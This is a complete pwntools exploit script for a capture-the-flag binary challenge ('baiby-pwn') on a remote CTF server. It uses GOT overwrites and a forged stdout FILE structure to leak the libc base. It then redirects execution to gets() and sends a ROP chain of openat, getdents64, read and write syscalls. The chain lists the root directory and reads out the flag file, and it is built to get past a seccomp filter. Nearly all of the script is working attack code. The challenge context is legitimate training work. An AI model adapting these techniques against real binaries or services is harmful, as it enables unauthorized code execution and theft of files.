#!/usr/bin/env python3
# baiby-pwn full solve: ASLR-indep libc leak (FSOP via setbuf) -> pop rbp -> gets -> ORW
from pwn import *
import sys, os, time
context.arch='amd64'; context.log_level='error'

REMOTE = '--remote' in sys.argv
HOST, PORT = 'tcp.flagyard.com', 28888
for a in sys.argv[1:]:
    if ':' in a and not a.startswith('-'):
        HOST, PORT = a.rsplit(':',1); PORT=int(PORT); REMOTE=True
LD = os.getcwd()+'/lib87'

# ---- 8.7 libc offsets ----
OFF = dict(gets=0x87080, read=0x11ba80, atol=0x46680, setbuf=0x8f750,
           pop_rdi=0x10f78b, pop_rsi=0x110bac, pop_rax=0xdd237, pop_rbx=0x586e4,
           syscall=0x98fb6, mov_rdx_rbx=0xb0153)

# ---- binary consts (no-PIE) ----
STACKCHK_GOT=0x404000; SETBUF_GOT=0x404008; MEMSET_GOT=0x404010; READ_GOT=0x404018; ATOL_GOT=0x404020
ARR=0x404080
G_READFILE=0x4011e2        # mov rsi,rax; mov edi,0; call read@plt  (inside getval)
G_MAIN=0x401211            # main entry
G_SETBUF_STDOUT=0x401231   # main: setbuf(stdout,NULL) sequence
G_ADDRSP8=0x4012d8
G_JMPLOOP=0x4012cc          # jmp 0x401259 (main loop): skip stderr after stdout read
SETBUF_LAZY=0x401040       # setbuf PLT lazy resolver stub
POP_RBP=0x40119d           # pop rbp; ret (binary)
# scratch in the RW page (past arr, within 0x404000-0x405000)
PATHBUF=0x404300; DIRBUF=0x404500; FLAGBUF=0x404800

def conn():
    if REMOTE: return remote(HOST, PORT)
    return process(['/app/baiby-pwn87'], env={'LD_LIBRARY_PATH':LD}, aslr=True)

def num(x):
    s=str(int(x)).encode(); assert len(s)<=7, x; return s.ljust(7,b'\x00')

def w(io, addr, val):   # case1: arr[i]=v  (val must fit in 7 decimal digits)
    io.send(num(1)); time.sleep(0.02)
    io.send(num((addr-ARR)//8)); time.sleep(0.02)
    io.send(num(val)); time.sleep(0.02)

def leak_base(io):
    # PHASE 1: set up GOT redirects
    w(io, SETBUF_GOT, G_READFILE)     # setbuf -> read(0, FILE, 0x40)
    w(io, MEMSET_GOT, G_SETBUF_STDOUT) # memset -> setbuf(stdout) directly (count=0x40 from case2)
    w(io, STACKCHK_GOT, G_JMPLOOP)     # __stack_chk_fail -> jmp loop (skip stderr)
    time.sleep(0.1)
    # PHASE 2: op=2 -> nested main -> 3 setbuf-gadget reads (stdin, stdout, stderr), edx=0x40 each
    LEAK=READ_GOT
    fsop  = p64(0xfbad0000)     # _flags: has-buffered-output marker
    fsop += p64(0)              # _IO_read_ptr
    fsop += p64(LEAK)           # _IO_read_end
    fsop += p64(0)              # _IO_read_base
    fsop += p64(LEAK)           # _IO_write_base
    fsop += p64(LEAK+0x10)      # _IO_write_ptr  -> flush writes [LEAK, LEAK+0x10) = read@GOT, atol@GOT
    fsop += p64(LEAK+0x10)      # _IO_write_end
    fsop += p64(0)              # _IO_buf_base
    assert len(fsop)==0x40
    dummy = b'\x00'*0x40        # safe (flags=0 -> no flush) for stdin & stderr
    io.send(num(2)); time.sleep(0.15)  # op=2 -> setbuf(stdout) gadget read(0,stdout,0x40)
    io.send(fsop);  time.sleep(0.15)   # -> stdout FILE (_fileno=1); then jmp loop
    # PHASE 3: restore setbuf via lazy stub, re-enter -> real setbuf(stdout) flush -> leak
    w(io, SETBUF_GOT, SETBUF_LAZY)
    time.sleep(0.1)
    io.send(num(2)); time.sleep(0.3)  # op=2 -> main -> setbuf(stdout) real -> flush
    data=io.recv(16, timeout=4)
    print('[leak] got %d bytes: %s'%(len(data),data.hex()))
    if len(data)<8: return None,data
    read_ptr=u64(data[:8].ljust(8,b'\x00'))
    base=read_ptr - OFF['read']
    return base, data


import re
def orw(io, base):
    def g(n): return base+OFF[n]
    P=[]
    def raw(*xs):
        for x in xs: P.append(p64(x))
    def setrdx(v): raw(g('pop_rbx'),v,g('mov_rdx_rbx'),0,0,0)
    def sc(nr,rdi,rsi): raw(g('pop_rdi'),rdi,g('pop_rsi'),rsi,g('pop_rax'),nr,g('syscall'))
    AT=0xffffffffffffff9c  # AT_FDCWD (-100); remote seccomp blocks open(2), use openat(257)
    setrdx(0x400); sc(0,0,PATHBUF)      # read(0,PATHBUF,0x400)   <- send "/"
    setrdx(0);     sc(257,AT,PATHBUF)   # openat(AT_FDCWD,"/",0)  -> fd 3
    setrdx(0x400); sc(217,3,DIRBUF)     # getdents64(3,DIRBUF,0x400)
    sc(1,1,DIRBUF)                      # write(1,DIRBUF,0x400)   -> listing to us
    sc(0,0,PATHBUF)                     # read(0,PATHBUF,0x400)   <- send flag path
    setrdx(0);     sc(257,AT,PATHBUF)   # openat(AT_FDCWD,path,0) -> fd 4
    setrdx(0x400); sc(0,4,FLAGBUF)      # read(4,FLAGBUF,0x400)
    sc(1,1,FLAGBUF)                     # write(1,FLAGBUF,0x400)  -> flag
    raw(g('pop_rax'),60,g('pop_rdi'),0,g('syscall'))  # exit(0)
    chain=b''.join(P)
    if b'\n' in (b'A'*8+chain):
        return None, b'NEWLINE_IN_PAYLOAD'
    # hijack: atol@GOT = pop rbp; ret ; then RIP = gets ; then overflow via gets
    w(io, ATOL_GOT, POP_RBP)
    time.sleep(0.1)
    io.send(p64(g('gets'))[:7]); time.sleep(0.1)   # -> RIP = gets
    io.sendline(b'A'*8 + chain); time.sleep(0.2)   # gets() writes chain onto stack
    io.send(b'/'); time.sleep(0.2)                  # read#1 path = "/"
    listing = io.recv(0x400, timeout=4)
    names = sorted(set(re.findall(rb'flag[-_.][0-9A-Za-z_.-]+', listing)))
    return names, listing

if __name__=='__main__':
    for attempt in range(40):
        io=conn()
        try:
            base,data=leak_base(io)
        except Exception as e:
            io.close(); continue
        if not data or len(data)<8:
            io.close(); continue
        try:
            names,listing=orw(io, base)
        except Exception as e:
            print("[.] attempt %d orw failed: %r"%(attempt,e)); io.close(); continue
        if names is None:            # newline in payload for this base -> reconnect (new ASLR)
            print("[.] attempt %d base %#x: newline in payload, retrying"%(attempt,base))
            io.close(); continue
        print("[*] leak ok base=%#x ; / candidates: %s"%(base,names))
        pick=None
        for c in names:
            if re.fullmatch(rb'flag-[0-9a-f]{32}\.txt', c): pick=c; break
        if not pick and names: pick=names[0]
        if not pick:
            print("[!] no flag file in listing:", listing[:200]); io.close(); continue
        path=b'/'+pick
        print("[*] opening", path.decode())
        io.send(path.ljust(0x40,b'\x00')); time.sleep(0.3)
        try:
            out=io.recv(0x400, timeout=4)
        except Exception as e:
            print("[.] attempt %d flag recv failed: %r"%(attempt,e)); io.close(); continue
        m=re.search(rb'(BH?Flag[Yy]?\{[^}]*\}|flag\{[^}]*\})', out)
        if m: print("\n[+] FLAG:", m.group().decode())
        else: print("[*] contents:", out.split(b"\x00")[0].decode('latin1'))
        io.close(); break
    else:
        print("[!] exhausted attempts")
